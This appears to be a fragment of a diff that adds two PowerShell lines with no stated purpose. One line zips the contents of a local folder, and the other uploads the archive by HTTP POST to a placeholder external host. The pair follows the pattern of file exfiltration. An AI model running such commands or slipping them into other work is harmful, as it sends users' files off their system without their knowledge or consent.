@@ -1,0 +1,2 @@
+Compress-Archive -Path C:\x\* -DestinationPath C:\t\a.zip
+Invoke-WebRequest -Uri https://upload.example/u -Method Post -InFile C:\t\a.zip
